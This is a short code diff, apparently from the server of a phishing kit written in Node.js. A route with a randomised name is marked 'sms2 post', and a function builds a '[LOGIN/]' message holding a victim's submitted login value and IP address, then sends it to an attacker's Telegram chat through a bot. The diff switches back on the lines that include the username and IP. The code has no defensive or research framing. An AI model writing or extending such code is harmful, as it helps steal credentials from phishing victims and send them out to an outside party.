@@ -172,10 +172,10 @@ app.post("/4cWAN9yzqstPGkN79uY4",(req,res)=>{ // sms2 post
 function a1(data,ip) {
     let block="";
     block += `${brand}  | [LOGIN/] |  \n`; 
-    // block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    // block += `USER: ${data.logita}\nIP: ${ip}\n`;
-    // block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    // block += `${brand}  | [${target}]  |  `;
+     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
+     block += `USER: ${data.logita}\nIP: ${ip}\n`;
+     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
+     block += `${brand}  | [${target}]  |  `;
     
     bot.telegram.sendMessage(process.env.CHATID,block);
     
